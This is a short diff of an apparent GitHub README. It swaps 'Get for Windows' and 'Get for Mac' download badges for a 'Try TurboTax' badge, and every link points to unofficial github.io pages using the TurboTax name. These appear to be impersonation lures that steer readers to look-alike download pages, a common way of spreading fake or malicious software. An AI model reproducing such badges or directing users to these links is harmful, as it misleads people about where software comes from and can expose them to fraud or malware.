@@ -6,10 +6,7 @@
 <br>
 <div align="center">
 
-[![💻 for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://evanderromanuvpk.github.io/.github/TurboTax-App)  
-
-[![🍏  for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://evanderromanuvpk.github.io/.github/TurboTax-App)
-</div>
+[![Try TurboTax](https://img.shields.io/badge/Try-TurboTax-2563EB?style=for-the-badge)](https://simplified-turbotax.github.io/.github/)
 
 ---
 
